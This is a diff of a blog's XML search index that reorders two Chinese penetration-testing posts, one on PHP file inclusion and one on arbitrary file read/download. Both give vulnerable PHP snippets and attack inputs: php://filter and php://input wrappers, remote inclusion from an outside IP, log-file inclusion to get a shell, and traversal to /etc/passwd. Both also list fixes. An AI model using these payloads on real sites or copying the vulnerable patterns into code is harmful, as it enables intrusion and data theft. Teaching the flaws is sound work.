@@ -59,6 +59,18 @@
       </tags>
   </entry>
   <entry>
+    <title><![CDATA[文件包含漏洞]]></title>
+    <url>%2F2019%2F08%2F19%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
+    <content type="text"><![CDATA[常见文件包含函数 include() //遇错警告 include_once() require() //遇错停止 require_once() @include:包含的文件不存在,程序会继续执行 @require:包含文件不存在,程序停止执行 文件包含漏洞原理 文件包含漏洞产生的原因是在通过引入文件时,引用的文件名,用户可控,由于传入的文件名没有经过合理的校验,或者校验被绕过 常见漏洞代码12345if(isset($_GET[&apos;page&apos;]))&#123; include $_GET[&apos;page&apos;];&#125;else&#123; include &quot;one.php&quot;;&#125; 文件包含漏洞危害 配合文件上传漏洞GetShell 可以执行任意脚本代码 网站源码以及配置文件泄露 远程包含GetShell 控制整个网站,甚至是服务器 文件包含漏洞分类 当被包含的文件在服务器本地时,就形成了本地文件包含漏洞 远程文件包含原理和本地文件包含同理 当php.ini中配置选项allow_url_fopen和allow_url_include 为 On 的话,则存在远程文件包含 %00 截断 需要magic_quotes_gpc=off PHP版本要小于5.3.4 路径长度截断 Windows文件名长于256Linux文件名长于4096 伪协议 读网站源码文件 index.php?page=php://filter/read=convert.base64-encode/resource=index.php @ 直接包含木马文件，可以是图片，txt,压缩包…. ?page=php://input接收POST请求,需要开启allow_url_include ?page=http://192.168.14.80/www/1.txt &gt; [phpinfo()]需要开启allow_url_fopen 和 allow_url_include (远程包含) ?page=data://text/plain,需要开启allow_url_fopen 和 allow_url_include 包含日志文件Getshell 首先要找到日志文件存放位置 php.ini的配置选项allow_url_fopen 和 allow_url_include为on 远程服务器上存放一个txt文件 , 或者不被解析的php文件 因为包含的时候返回的是php源代码，所以不能被解析 修复方法 PHP中使用open_basedir配置限制访问在指定的区域 过滤 .（点）/（反斜杠）\（反斜杠） 禁止服务器远程文件包含 (allow_url_fopen , allow_url_include , off)]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[文件查看与下载]]></title>
     <url>%2F2019%2F08%2F19%2F%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E4%B8%8E%E4%B8%8B%E8%BD%BD%2F</url>
     <content type="text"><![CDATA[背景 一些网站的业务需求，可能提供文件查看或下载的功能，如果对用户 查看或下载的文件不做限制，就能够查看或下载任意的文件，可以是源 代码文件、敏感文件等等。 成因 不管是任意文件读取还是任意文件下载，触发的漏洞条件都是相同的 存在读取文件的函数 读取文件的路径用户可控且未校验或校验不严 输出了文件内容 漏洞危害 下载服务器任意文件，包含脚本代码文件 、系统敏感文件等。可以 配合其它类型的漏洞。可以进一步代码审计，查找更多可利用的代码。 漏洞分类 任意文件读取 12345678910111213&lt;?php $filename=&quot;test.txt&quot;;readfile($filename);?&gt;&lt;?php $filename=&quot;test.txt&quot;;echo file_get_contens($filename);?&gt;&lt;?php $filename=&quot;test.txt&quot;; $fp=fopen($filename,&quot;r&quot;)or die(&quot;Unable to open file!&quot;); $data=fread($fp,1024); fclose($fp); echo $data;?&gt; $filename=$_GET[f]; $filename没有经过校验,或者校验不合格,用户可以控制这个变量读取任意文件,比如/etc/passwd,index.php等等. 任意文件下载 123456789101112131415&lt;?php if(empty($_GET[&apos;filename&apos;]))&#123; exit(); &#125; $filename=$_GET[&apos;filename&apos;]; *eader(&quot;Content-Type:application/octet-stream&quot;); header(&quot;Accept-Length:&quot;.filesize($filename)); header(&quot; Content-Disposition:attachment;filename=&quot;.$filename ); readfile($filename);?&gt; 在上述代码中: $filename=&quot;uploads/20170206.jpg&quot;; $filename一般是用户需要下载的文件 $filename$_GET[f]; $filename没有经验校验,或者校验不合格,用户可以控制这个变量下载任意文件,比如/etc/passwd 漏洞挖掘 Web漏洞扫描器(AWVS,AppScan,Openvas,Nessus) 手动从链接 readfile.php?file=xxx.txt download.php?file=xxx.rar 参数名查看 &amp;readpath,&amp;filepath,&amp;path,&amp;inputfile,&amp;url,&amp;data,&amp;readfile,&amp;menu,META-INF,WEB-INF 漏洞验证 index.php?f=../../../../../etc/passwd index.php?f=../index.php index.php?f=file:///etc/passwd 当参数f值为php文件时: 若文件被解析则是文件包含漏洞 若显示源码,则是文件查看漏洞 提示下载则是文件下载漏洞 漏洞修复方案 过滤 . 点,使用户在url中不能回溯上级目录 正则严格判断用户输入的参数 php.ini配置open_basedir限制文件访问范围]]></content>
@@ -69,18 +81,6 @@
         <tag>PHP</tag>
         <tag>文件查看</tag>
         <tag>文件下载</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[文件包含漏洞]]></title>
-    <url>%2F2019%2F08%2F19%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
-    <content type="text"><![CDATA[常见文件包含函数 include() //遇错警告 include_once() require() //遇错停止 require_once() @include:包含的文件不存在,程序会继续执行 @require:包含文件不存在,程序停止执行 文件包含漏洞原理 文件包含漏洞产生的原因是在通过引入文件时,引用的文件名,用户可控,由于传入的文件名没有经过合理的校验,或者校验被绕过 常见漏洞代码12345if(isset($_GET[&apos;page&apos;]))&#123; include $_GET[&apos;page&apos;];&#125;else&#123; include &quot;one.php&quot;;&#125; 文件包含漏洞危害 配合文件上传漏洞GetShell 可以执行任意脚本代码 网站源码以及配置文件泄露 远程包含GetShell 控制整个网站,甚至是服务器 文件包含漏洞分类 当被包含的文件在服务器本地时,就形成了本地文件包含漏洞 远程文件包含原理和本地文件包含同理 当php.ini中配置选项allow_url_fopen和allow_url_include 为 On 的话,则存在远程文件包含 %00 截断 需要magic_quotes_gpc=off PHP版本要小于5.3.4 路径长度截断 Windows文件名长于256Linux文件名长于4096 伪协议 读网站源码文件 index.php?page=php://filter/read=convert.base64-encode/resource=index.php @ 直接包含木马文件，可以是图片，txt,压缩包…. ?page=php://input接收POST请求,需要开启allow_url_include ?page=http://192.168.14.80/www/1.txt &gt; [phpinfo()]需要开启allow_url_fopen 和 allow_url_include (远程包含) ?page=data://text/plain,需要开启allow_url_fopen 和 allow_url_include 包含日志文件Getshell 首先要找到日志文件存放位置 php.ini的配置选项allow_url_fopen 和 allow_url_include为on 远程服务器上存放一个txt文件 , 或者不被解析的php文件 因为包含的时候返回的是php源代码，所以不能被解析 修复方法 PHP中使用open_basedir配置限制访问在指定的区域 过滤 .（点）/（反斜杠）\（反斜杠） 禁止服务器远程文件包含 (allow_url_fopen , allow_url_include , off)]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>文件包含</tag>
       </tags>
   </entry>
   <entry>
